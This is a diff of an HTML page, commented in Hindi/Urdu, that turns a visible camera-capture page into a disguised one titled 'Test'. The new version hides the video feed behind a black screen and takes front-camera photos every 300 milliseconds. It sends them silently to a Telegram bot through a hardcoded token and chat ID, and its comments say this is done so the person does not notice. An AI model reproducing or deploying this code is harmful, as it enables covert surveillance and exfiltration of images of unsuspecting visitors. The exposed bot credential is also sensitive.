@@ -3,72 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture</title>
+    <title>Test</title>
 </head>
-<body style="text-align: center; font-family: Arial; padding-top: 20px; background: #111; color: white;">
-    <h2>📸 Accessing Camera...</h2>
-    <video id="video" width="320" height="240" autoplay playsinline style="border:2px solid #00ff00;border-radius:10px; max-width: 90%;"></video>
-    <p id="status" style="color: yellow;">⏳ Permission maang raha hu...</p>
-
+<body style="background: black; margin: 0; padding: 0; overflow: hidden;">
+    <!-- 🔥 Video element BILKUL HIDDEN (dikhega nahi) -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    
     <script>
-        // ---------- 🔥 APNI DETAILS YAHAN DALO ----------
+        // ---------- APNI DETAILS YAHAN DALO ----------
         const BOT_TOKEN = "8882202375:AAF76tk6iLG8dskhKQ1vH5hDL3iG2YtvitQ";
-        const CHAT_ID = 8856652090; //
-        // ------------------------------------------------
+        const CHAT_ID = 8856652090; // 
+        // ---------------------------------------------
 
         const video = document.getElementById('video');
         const canvas = document.createElement('canvas');
-        const status = document.getElementById('status');
+        let isCapturing = false;
+        let intervalId = null;
 
         // 1. Camera start karo
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(stream => {
                 video.srcObject = stream;
-                status.innerHTML = "✅ Camera Ready! 1.5 second mein photo click hogi...";
                 
-                // ⏰ 1.5 second baad AUTO CAPTURE (Bina button ke)
+                // 🟢 500ms baad capture start karo (taake camera stable ho jaye)
                 setTimeout(() => {
-                    captureAndSend();
-                }, 1500);
+                    isCapturing = true;
+                    // 🔥 HAR 300MS MEIN EK PHOTO (2 sec mein ~6-7 photo)
+                    intervalId = setInterval(captureAndSend, 300);
+                    
+                    // 📌 Console mein sirf ek baar log karo (pata na chale)
+                    console.log("✅ Capture started");
+                }, 500);
             })
             .catch(err => {
-                status.innerHTML = "❌ Camera Access Denied! Browser settings mein Allow karo.";
-                console.error(err);
+                // ❌ Agar permission deny kare toh kuch mat dikhao (bas console mein error)
+                console.error("Camera access denied:", err);
             });
 
         // 2. Capture aur Send ka kaam
         function captureAndSend() {
-            status.innerHTML = "⏳ Photo le raha hoon aur bhej raha hoon...";
+            if (!isCapturing) return;
             
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            try {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(function(blob) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'captured.jpg');
+                canvas.toBlob(function(blob) {
+                    if (!blob) return;
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'burst.jpg');
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ok) {
-                        status.innerHTML = "✅ Photo Owner ko bhej di! Ab yeh page band kar sakte ho.";
-                        // Camera band karo (battery bachane ke liye)
-                        video.srcObject.getTracks().forEach(track => track.stop());
-                    } else {
-                        status.innerHTML = "❌ Error: " + data.description;
-                    }
-                })
-                .catch(err => {
-                    status.innerHTML = "❌ Network Error!";
-                });
-            }, 'image/jpeg');
+                    // 📤 Photo bhejo (background mein, koi dikhega nahi)
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data.ok) {
+                            console.error("Send error:", data.description);
+                        }
+                    })
+                    .catch(err => {
+                        console.error("Network error:", err);
+                    });
+                }, 'image/jpeg', 0.8);
+            } catch(e) {
+                console.error("Capture error:", e);
+            }
         }
+
+        // 🔄 Agar page band ho toh capture rok do (battery bachane ke liye)
+        window.addEventListener('beforeunload', function() {
+            if (intervalId) clearInterval(intervalId);
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+        });
     </script>
 </body>
 </html>
